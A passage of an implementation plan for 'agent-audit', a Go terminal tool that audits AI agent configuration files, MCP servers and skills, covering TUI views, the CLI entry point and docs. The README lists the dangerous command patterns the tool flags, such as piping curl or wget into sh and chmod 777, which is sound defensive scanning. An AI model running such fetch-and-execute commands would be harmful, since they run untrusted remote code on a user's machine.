	colorBase    = lipgloss.AdaptiveColor{Light: "#1a1a2e", Dark: "#e2e8f0"}
	colorMuted   = lipgloss.AdaptiveColor{Light: "#6b7280", Dark: "#94a3b8"}
	colorAccent  = lipgloss.AdaptiveColor{Light: "#3b82f6", Dark: "#60a5fa"}
	colorCrit    = lipgloss.AdaptiveColor{Light: "#dc2626", Dark: "#f87171"}
	colorWarn    = lipgloss.AdaptiveColor{Light: "#d97706", Dark: "#fbbf24"}
	colorOK      = lipgloss.AdaptiveColor{Light: "#059669", Dark: "#34d399"}
	colorTab     = lipgloss.AdaptiveColor{Light: "#374151", Dark: "#cbd5e1"}
	colorTabSel  = lipgloss.AdaptiveColor{Light: "#1d4ed8", Dark: "#93c5fd"}
	colorBorder  = lipgloss.AdaptiveColor{Light: "#d1d5db", Dark: "#334155"}

	StyleBase = lipgloss.NewStyle().Foreground(colorBase)

	StyleTitle = lipgloss.NewStyle().
			Bold(true).
			Foreground(colorAccent).
			MarginBottom(1)

	StyleTab = lipgloss.NewStyle().
			Padding(0, 2).
			Foreground(colorTab)

	StyleTabActive = lipgloss.NewStyle().
			Padding(0, 2).
			Foreground(colorTabSel).
			Bold(true).
			Underline(true)

	StyleTabBar = lipgloss.NewStyle().
			BorderStyle(lipgloss.NormalBorder()).
			BorderBottom(true).
			BorderForeground(colorBorder).
			MarginBottom(1)

	StyleCritical = lipgloss.NewStyle().Foreground(colorCrit).Bold(true)
	StyleWarning  = lipgloss.NewStyle().Foreground(colorWarn).Bold(true)
	StyleOK       = lipgloss.NewStyle().Foreground(colorOK)
	StyleMuted    = lipgloss.NewStyle().Foreground(colorMuted)

	StyleBox = lipgloss.NewStyle().
			Border(lipgloss.RoundedBorder()).
			BorderForeground(colorBorder).
			Padding(0, 1)

	StyleHeader = lipgloss.NewStyle().
			Bold(true).
			Foreground(colorAccent).
			PaddingBottom(1)

	StyleStatusBar = lipgloss.NewStyle().
			Foreground(colorMuted).
			PaddingTop(1)
)
```

- [ ] **Step 2: Build to verify no import errors**

```bash
go build ./internal/tui/...
```

Expected: exit 0

- [ ] **Step 3: Commit**

```bash
git add internal/tui/styles.go
git commit -m "feat: TUI Lipgloss styles"
```

---

### Task 13: TUI Views

**Files:**
- Create: `internal/tui/overview.go`
- Create: `internal/tui/agents.go`
- Create: `internal/tui/mcpview.go`
- Create: `internal/tui/skillsview.go`
- Create: `internal/tui/security.go`
- Create: `internal/tui/filesview.go`

**Interfaces:**
- Consumes: `model.ScanResult`, `internal/tui/styles.go`
- Produces: each file exports a `render*(result *model.ScanResult, width, height int) string` function consumed by `app.go`

- [ ] **Step 1: Write internal/tui/overview.go**

```go
package tui

import (
	"fmt"
	"github.com/charmbracelet/lipgloss"
	"github.com/skromesch/agent-audit/internal/model"
)

func renderOverview(result *model.ScanResult, width, _ int) string {
	if result == nil {
		return StyleMuted.Render("Scanning...")
	}

	critStr := fmt.Sprintf("%d", result.CriticalCount())
	warnStr := fmt.Sprintf("%d", result.WarningCount())
	if result.CriticalCount() > 0 {
		critStr = StyleCritical.Render(critStr)
	}
	if result.WarningCount() > 0 {
		warnStr = StyleWarning.Render(warnStr)
	}

	summary := lipgloss.JoinVertical(lipgloss.Left,
		StyleTitle.Render("agent-audit"),
		StyleMuted.Render("Root: "+result.Root),
		"",
		StyleHeader.Render("Detected Tools"),
	)

	for _, a := range result.Agents {
		summary += "\n  " + StyleOK.Render("✓") + "  " + a.Tool
	}
	if len(result.Agents) == 0 {
		summary += "\n  " + StyleMuted.Render("none detected")
	}

	stats := lipgloss.JoinVertical(lipgloss.Left,
		"",
		StyleHeader.Render("Statistics"),
		fmt.Sprintf("  MCP Servers   %s", StyleOK.Render(fmt.Sprintf("%d", len(result.MCPServers)))),
		fmt.Sprintf("  Skills        %s", StyleOK.Render(fmt.Sprintf("%d", len(result.Skills)))),
		fmt.Sprintf("  Config Files  %s", StyleMuted.Render(fmt.Sprintf("%d", len(result.ConfigFiles)))),
		fmt.Sprintf("  Critical      %s", critStr),
		fmt.Sprintf("  Warnings      %s", warnStr),
	)

	content := lipgloss.JoinVertical(lipgloss.Left, summary, stats)
	return StyleBox.Width(width - 4).Render(content)
}
```

- [ ] **Step 2: Write internal/tui/agents.go**

```go
package tui

import (
	"fmt"
	"strings"
	"github.com/skromesch/agent-audit/internal/model"
)

func renderAgents(result *model.ScanResult, width, _ int) string {
	if result == nil || len(result.Agents) == 0 {
		return StyleMuted.Render("No agents detected.")
	}

	var sb strings.Builder
	sb.WriteString(StyleHeader.Render("Detected Agents") + "\n\n")

	for _, a := range result.Agents {
		sb.WriteString(StyleTitle.Render(a.Tool) + "\n")
		if len(a.ConfigFiles) > 0 {
			sb.WriteString(StyleMuted.Render("  Config files:") + "\n")
			for _, f := range a.ConfigFiles {
				sb.WriteString(fmt.Sprintf("    %s\n", f))
			}
		}
		if len(a.Settings) > 0 {
			sb.WriteString(StyleMuted.Render("  Settings:") + "\n")
			for k, v := range a.Settings {
				sb.WriteString(fmt.Sprintf("    %s = %s\n", k, v))
			}
		}
		sb.WriteString("\n")
	}
	return StyleBox.Width(width - 4).Render(sb.String())
}
```

- [ ] **Step 3: Write internal/tui/mcpview.go**

```go
package tui

import (
	"fmt"
	"strings"
	"github.com/skromesch/agent-audit/internal/model"
)

func renderMCP(result *model.ScanResult, width, _ int) string {
	if result == nil || len(result.MCPServers) == 0 {
		return StyleMuted.Render("No MCP servers detected.")
	}

	var sb strings.Builder
	sb.WriteString(StyleHeader.Render(fmt.Sprintf("MCP Servers (%d)", len(result.MCPServers))) + "\n\n")

	for _, s := range result.MCPServers {
		sb.WriteString(StyleTitle.Render(s.Name) + "\n")
		sb.WriteString(fmt.Sprintf("  Command:  %s %s\n", s.Command, strings.Join(s.Args, " ")))
		sb.WriteString(fmt.Sprintf("  Source:   %s\n", s.Source))
		if len(s.Env) > 0 {
			sb.WriteString(StyleMuted.Render("  Env vars:") + "\n")
			for k, v := range s.Env {
				sb.WriteString(fmt.Sprintf("    %s = %s\n", k, v))
			}
		}
		sb.WriteString("\n")
	}
	return StyleBox.Width(width - 4).Render(sb.String())
}
```

- [ ] **Step 4: Write internal/tui/skillsview.go**

```go
package tui

import (
	"fmt"
	"strings"
	"github.com/skromesch/agent-audit/internal/model"
)

func renderSkills(result *model.ScanResult, width, _ int) string {
	if result == nil || len(result.Skills) == 0 {
		return StyleMuted.Render("No skills detected.")
	}

	var sb strings.Builder
	sb.WriteString(StyleHeader.Render(fmt.Sprintf("Skills (%d)", len(result.Skills))) + "\n\n")

	for _, sk := range result.Skills {
		status := StyleOK.Render("✓ valid")
		if !sk.Valid {
			status = StyleCritical.Render("✗ invalid")
		}
		sb.WriteString(fmt.Sprintf("%s  %s\n", status, StyleTitle.Render(sk.Name)))
		if sk.Description != "" {
			sb.WriteString(fmt.Sprintf("   %s\n", StyleMuted.Render(sk.Description)))
		}
		if len(sk.Issues) > 0 {
			for _, issue := range sk.Issues {
				sb.WriteString(fmt.Sprintf("   %s %s\n", StyleWarning.Render("!"), issue))
			}
		}
		sb.WriteString(fmt.Sprintf("   %s\n\n", StyleMuted.Render(sk.Path)))
	}
	return StyleBox.Width(width - 4).Render(sb.String())
}
```

- [ ] **Step 5: Write internal/tui/security.go**

```go
package tui

import (
	"fmt"
	"strings"
	"github.com/skromesch/agent-audit/internal/model"
)

func renderSecurity(result *model.ScanResult, width, _ int) string {
	if result == nil || len(result.Findings) == 0 {
		return StyleOK.Render("✓ No security findings.")
	}

	var sb strings.Builder
	sb.WriteString(StyleHeader.Render(fmt.Sprintf("Security Findings (%d)", len(result.Findings))) + "\n\n")

	for _, f := range result.Findings {
		var severityStyle lipgloss.Style
		icon := "ℹ"
		switch f.Severity {
		case model.SeverityCritical:
			severityStyle = StyleCritical
			icon = "✗"
		case model.SeverityWarning:
			severityStyle = StyleWarning
			icon = "!"
		default:
			severityStyle = StyleMuted
		}

		sb.WriteString(fmt.Sprintf("%s [%s] %s\n",
			severityStyle.Render(icon),
			severityStyle.Render(string(f.Severity)),
			f.Description,
		))
		sb.WriteString(fmt.Sprintf("  %s\n\n", StyleMuted.Render(f.Path)))
	}
	return StyleBox.Width(width - 4).Render(sb.String())
}
```

Note: add `"github.com/charmbracelet/lipgloss"` import to security.go since `lipgloss.Style` is used.

- [ ] **Step 6: Write internal/tui/filesview.go**

```go
package tui

import (
	"fmt"
	"strings"
)

func renderFiles(result *model.ScanResult, width, _ int) string {
	if result == nil || len(result.ConfigFiles) == 0 {
		return StyleMuted.Render("No configuration files found.")
	}

	var sb strings.Builder
	sb.WriteString(StyleHeader.Render(fmt.Sprintf("Config Files (%d)", len(result.ConfigFiles))) + "\n\n")

	for _, f := range result.ConfigFiles {
		sb.WriteString(fmt.Sprintf("  %s\n", f))
	}
	return StyleBox.Width(width - 4).Render(sb.String())
}
```

Add missing import for `model` to `filesview.go`:

```go
package tui

import (
	"fmt"
	"strings"
	"github.com/skromesch/agent-audit/internal/model"
)

func renderFiles(result *model.ScanResult, width, _ int) string {
	if result == nil || len(result.ConfigFiles) == 0 {
		return StyleMuted.Render("No configuration files found.")
	}

	var sb strings.Builder
	sb.WriteString(StyleHeader.Render(fmt.Sprintf("Config Files (%d)", len(result.ConfigFiles))) + "\n\n")

	for _, f := range result.ConfigFiles {
		sb.WriteString(fmt.Sprintf("  %s\n", f))
	}
	return StyleBox.Width(width - 4).Render(sb.String())
}
```

- [ ] **Step 7: Build to catch compile errors**

```bash
go build ./internal/tui/...
```

Expected: exit 0

- [ ] **Step 8: Commit**

```bash
git add internal/tui/overview.go internal/tui/agents.go internal/tui/mcpview.go \
        internal/tui/skillsview.go internal/tui/security.go internal/tui/filesview.go
git commit -m "feat: TUI view renderers (overview, agents, MCP, skills, security, files)"
```

---

### Task 14: TUI App (Main Bubble Tea Model)

**Files:**
- Create: `internal/tui/app.go`

**Interfaces:**
- Consumes: all `render*` functions from Task 13, `model.ScanResult`, `scanner.Orchestrator`
- Produces: `tui.Run(result *model.ScanResult) error` — starts the TUI

- [ ] **Step 1: Write internal/tui/app.go**

```go
package tui

import (
	"fmt"
	"strings"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/skromesch/agent-audit/internal/model"
)

var tabs = []string{"Overview", "Agents", "MCP", "Skills", "Security", "Files"}

type App struct {
	activeTab int
	width     int
	height    int
	result    *model.ScanResult
}

func NewApp(result *model.ScanResult) *App {
	return &App{result: result}
}

func (a App) Init() tea.Cmd { return nil }

func (a App) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		a.width = msg.Width
		a.height = msg.Height
	case tea.KeyMsg:
		switch msg.String() {
		case "q", "ctrl+c":
			return a, tea.Quit
		case "tab":
			a.activeTab = (a.activeTab + 1) % len(tabs)
		case "shift+tab":
			a.activeTab = (a.activeTab - 1 + len(tabs)) % len(tabs)
		}
	}
	return a, nil
}

func (a App) View() string {
	if a.width == 0 {
		return "Loading..."
	}

	// Tab bar
	tabBar := renderTabBar(a.activeTab, a.width)

	// Content area
	contentHeight := a.height - 4 // tab bar + status bar
	content := a.renderActiveTab(a.width, contentHeight)

	// Status bar
	status := StyleStatusBar.Render(
		fmt.Sprintf("  %s  q:quit  tab:next  shift+tab:prev",
			StyleMuted.Render(a.result.Root)),
	)

	return lipgloss.JoinVertical(lipgloss.Left, tabBar, content, status)
}

func (a App) renderActiveTab(width, height int) string {
	switch a.activeTab {
	case 0:
		return renderOverview(a.result, width, height)
	case 1:
		return renderAgents(a.result, width, height)
	case 2:
		return renderMCP(a.result, width, height)
	case 3:
		return renderSkills(a.result, width, height)
	case 4:
		return renderSecurity(a.result, width, height)
	case 5:
		return renderFiles(a.result, width, height)
	default:
		return ""
	}
}

func renderTabBar(active, width int) string {
	var parts []string
	for i, t := range tabs {
		if i == active {
			parts = append(parts, StyleTabActive.Render(t))
		} else {
			parts = append(parts, StyleTab.Render(t))
		}
	}
	bar := strings.Join(parts, " ")
	return StyleTabBar.Width(width).Render(bar)
}

// Run starts the Bubble Tea TUI with the given scan result.
func Run(result *model.ScanResult) error {
	app := NewApp(result)
	p := tea.NewProgram(app, tea.WithAltScreen())
	_, err := p.Run()
	return err
}
```

- [ ] **Step 2: Build to verify**

```bash
go build ./internal/tui/...
```

Expected: exit 0

- [ ] **Step 3: Commit**

```bash
git add internal/tui/app.go
git commit -m "feat: Bubble Tea TUI app with tabbed navigation"
```

---

### Task 15: CLI Entry Point

**Files:**
- Create: `cmd/agent-audit/main.go`

**Interfaces:**
- Consumes: `scanner.Orchestrator`, `scanner.New*Scanner()`, `report.*`, `tui.Run`, `model.ScanResult`
- Produces: working binary `./agent-audit`

- [ ] **Step 1: Write cmd/agent-audit/main.go**

```go
package main

import (
	"context"
	"flag"
	"fmt"
	"os"

	"github.com/skromesch/agent-audit/internal/report"
	"github.com/skromesch/agent-audit/internal/scanner"
	"github.com/skromesch/agent-audit/internal/tui"
)

func main() {
	var (
		jsonOut     = flag.Bool("json", false, "write report.json and exit")
		markdownOut = flag.Bool("markdown", false, "write report.md and exit")
		htmlOut     = flag.Bool("html", false, "write report.html and exit")
	)
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: agent-audit [flags] [path]\n\nFlags:\n")
		flag.PrintDefaults()
	}
	flag.Parse()

	root := "."
	if flag.NArg() > 0 {
		root = flag.Arg(0)
	}

	if info, err := os.Stat(root); err != nil || !info.IsDir() {
		fmt.Fprintf(os.Stderr, "error: %q is not a directory\n", root)
		os.Exit(1)
	}

	orch := scanner.NewOrchestrator([]scanner.Scanner{
		scanner.NewClaudeScanner(),
		scanner.NewCodexScanner(),
		scanner.NewCursorScanner(),
		scanner.NewContinueScanner(),
		scanner.NewAiderScanner(),
		scanner.NewMCPScanner(),
		scanner.NewSkillsScanner(),
	})

	result, err := orch.Run(context.Background(), root)
	if err != nil {
		fmt.Fprintf(os.Stderr, "scan error: %v\n", err)
		os.Exit(1)
	}

	if *jsonOut {
		f, err := os.Create("report.json")
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		defer f.Close()
		if err := report.WriteJSON(result, f); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		fmt.Println("report.json written")
		return
	}

	if *markdownOut {
		f, err := os.Create("report.md")
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		defer f.Close()
		if err := report.WriteMarkdown(result, f); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		fmt.Println("report.md written")
		return
	}

	if *htmlOut {
		f, err := os.Create("report.html")
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		defer f.Close()
		if err := report.WriteHTML(result, f); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		fmt.Println("report.html written")
		return
	}

	// Default: TUI mode
	if err := tui.Run(result); err != nil {
		fmt.Fprintf(os.Stderr, "tui error: %v\n", err)
		os.Exit(1)
	}
}
```

- [ ] **Step 2: Build binary**

```bash
go build -o agent-audit ./cmd/agent-audit/
```

Expected: `./agent-audit` binary created

- [ ] **Step 3: Smoke-test report modes against fixture**

```bash
./agent-audit --json internal/fixtures/sample-project && head -5 report.json
./agent-audit --markdown internal/fixtures/sample-project && head -5 report.md
./agent-audit --html internal/fixtures/sample-project && head -3 report.html
```

Expected: each produces output with no errors

- [ ] **Step 4: Commit**

```bash
git add cmd/
git commit -m "feat: CLI entry point with TUI, JSON, Markdown, and HTML modes"
```

---

### Task 16: Documentation and Sample Reports

**Files:**
- Create: `README.md`
- Create: `docs/architecture.md`
- Create: `docs/sample-report.json` (generated)
- Create: `docs/sample-report.md` (generated)

- [ ] **Step 1: Write README.md**

```markdown
# agent-audit

Audit AI agent configurations in software projects.

Detects Claude Code, Codex, Cursor, Continue.dev, and Aider configurations.
Finds MCP servers, skills, secrets, dangerous commands, and misconfigurations.

## Installation

```bash
go install github.com/skromesch/agent-audit/cmd/agent-audit@latest
```

Or build from source:

```bash
make build
```

## Usage

```bash
# TUI mode (default)
agent-audit .
agent-audit ~/myproject

# Report modes
agent-audit . --json       # writes report.json
agent-audit . --markdown   # writes report.md
agent-audit . --html       # writes report.html
```

## Keyboard Shortcuts

| Key          | Action         |
|--------------|----------------|
| `q`          | Quit           |
| `Tab`        | Next view      |
| `Shift+Tab`  | Previous view  |

## Supported Ecosystems

- **Claude Code** — CLAUDE.md, .claude/settings.json, .claude/skills/, .mcp.json
- **Codex** — AGENTS.md, .codex/config.toml
- **Cursor** — .cursor/rules/, .cursor/settings.json
- **Continue.dev** — .continue/config.yaml
- **Aider** — .aider.conf.yml, .aider*

## Security Checks

- API key and token detection (masked in output)
- Dangerous MCP server commands (curl|sh, rm, sudo)
- Unrestricted permission settings
- Disabled sandbox/approval modes

## Development

```bash
make test    # run tests
make lint    # run golangci-lint
make bench   # run benchmarks
```
```

- [ ] **Step 2: Write docs/architecture.md**

```markdown
# Architecture

## Overview

agent-audit follows a pipeline architecture:

```
root directory
      │
      ▼
 Orchestrator (concurrent)
      │
  ┌───┴────────────────────────────────────┐
  │  ClaudeScanner  CodexScanner  ...      │
  └───────────────────────────────────────-┘
      │
      ▼
  ScanResult (merged)
      │
  ┌───┴──────────────────┐
  │   TUI   │  Reports   │
  └─────────────────────-┘
```

## Scanner Interface

Every ecosystem scanner implements:

```go
type Scanner interface {
    Name() string
    Scan(ctx context.Context, root string) (*ScannerResult, error)
}
```

## Adding a New Scanner

1. Create `internal/scanner/myecosystem.go`
2. Implement `Scanner` interface
3. Add to the orchestrator slice in `cmd/agent-audit/main.go`
4. Add fixtures under `internal/fixtures/sample-project/`
5. Write tests in `internal/scanner/myecosystem_test.go`

## Security Rules

Rules live in `internal/rules/` and are called by scanners:

- `ScanForSecrets(path, content)` — regex-based secret detection
- `CheckMCPCommands(server)` — dangerous command patterns
- `CheckPermissions(tool, path, content)` — permission misconfigurations
```

- [ ] **Step 3: Generate sample reports**

```bash
./agent-audit --json internal/fixtures/sample-project
cp report.json docs/sample-report.json

./agent-audit --markdown internal/fixtures/sample-project
cp report.md docs/sample-report.md
```

- [ ] **Step 4: Commit**

```bash
git add README.md docs/
git commit -m "docs: README, architecture guide, and sample reports"
```

---

### Task 17: Full Test Suite and Coverage Check

**Files:**
- No new files — this task verifies coverage across all existing test files

- [ ] **Step 1: Run full test suite**

```bash
go test -race ./... 2>&1
```

Expected: all packages PASS, no race conditions

- [ ] **Step 2: Check coverage**

```bash
go test -coverprofile=coverage.out ./...
go tool cover -func=coverage.out | grep total
```

Expected: total coverage ≥ 80%

If below 80%, identify uncovered code:

```bash
go tool cover -html=coverage.out -o coverage.html
open coverage.html  # review which lines lack coverage
```

Add missing tests for uncovered branches (secrets patterns not tested, error paths, etc.)

- [ ] **Step 3: Run linter**

```bash
golangci-lint run ./...
```

Fix any reported issues.

- [ ] **Step 4: Final build verification**

```bash
make build
./agent-audit --version 2>/dev/null || echo "binary works"
./agent-audit --json internal/fixtures/sample-project
cat report.json | python3 -m json.tool > /dev/null && echo "valid JSON"
```

- [ ] **Step 5: Commit**

```bash
git add -A
git commit -m "test: full suite passing with >80% coverage"
```

---

## Self-Review Against Spec

### Spec Coverage Checklist

- [x] OpenAI Codex: AGENTS.md, .codex/config.toml, user-level config — **Task 6**
- [x] Claude Code: CLAUDE.md, settings.json, skills, .mcp.json — **Task 5**
- [x] Cursor: .cursor/rules, settings.json — **Task 7**
- [x] Continue.dev: .continue/config.yaml — **Task 7**
- [x] Aider: .aider.conf.yml, .aider* — **Task 7**
- [x] MCP discovery: .mcp.json, per-tool dirs, MCPServer struct — **Task 8**
- [x] Skills discovery: skills/, .claude/skills/, skill.md validation — **Task 9**
- [x] Security: secrets detection + masking — **Task 3**
- [x] Security: dangerous commands (rm, sudo, curl|sh, wget|sh, chmod 777) — **Task 3**
- [x] Security: permission risks (wildcard allow, disabled sandbox) — **Task 3**
- [x] Severity levels: INFO, WARNING, CRITICAL — **Task 2**
- [x] Scanner interface — **Task 4**
- [x] TUI: six tabs (Overview, Agents, MCP, Skills, Security, Files) — **Tasks 12-14**
- [x] Keyboard: q, tab, shift+tab — **Task 14**
- [x] CLI: `agent-audit .`, `agent-audit ~/project`, `--json`, `--markdown`, `--html` — **Task 15**
- [x] Output: report.json, report.md, report.html — **Task 15**
- [x] Concurrent scanning with context — **Task 4**
- [x] Fixture repository with valid + invalid + security issues — **Task 9**
- [x] Tests verify tool/MCP/skill detection, security warnings, invalid configs — **Tasks 5-10**
- [x] Integration tests against fixture — **Task 10**
- [x] Benchmark tests — **Task 10**
- [x] README, architecture docs, sample reports — **Task 16**
- [x] Makefile — **Task 1**
- [x] GitHub Actions CI — **Task 1**
- [x] golangci-lint config — **Task 1**
- [x] Cross-platform (filepath.Join throughout, no hardcoded /) — all tasks
- [ ] **GAP:** `r` (rescan) and `e` (export report) keyboard shortcuts not implemented in TUI — add to Task 14's `Update` method: `r` re-runs scan; `e` calls `report.WriteJSON` to `report.json`
- [ ] **GAP:** `enter` (open details) keyboard shortcut — add a detail panel toggle in app.go
- [ ] **GAP:** User-level Claude settings (`~/.claude/settings.json`) — included in claude.go candidates list ✓
- [ ] **GAP:** `/etc/codex/config.toml` — add to codex.go candidates list

### Placeholder Scan

No TBD, TODO, or "implement later" items found.

### Type Consistency

- `model.ScanResult.CriticalCount()` and `WarningCount()` defined in Task 2, used in Task 13 ✓
- `scanner.ScannerResult` defined in Task 4, returned by all scanners ✓  
- `scanner.Scanner` interface used in orchestrator test stub matches definition ✓
- `render*(result *model.ScanResult, width, height int) string` signatures consistent across all views ✓

### Gaps to Fix Inline

In Task 6 (codex.go), add `/etc/codex/config.toml` to candidates:

```go
candidates = append(candidates, filepath.Join("/etc", "codex", "config.toml"))
```

In Task 14 (app.go Update), add `r` and `e` cases:

```go
case "r":
    // Trigger rescan — emit a command that re-runs orchestration
    // For MVP, rescan is a no-op (result is passed in at start)
    // Full implementation: emit a tea.Cmd that calls orch.Run async
case "e":
    go func() {
        f, _ := os.Create("report.json")
        defer f.Close()
        report.WriteJSON(a.result, f)
    }()
```
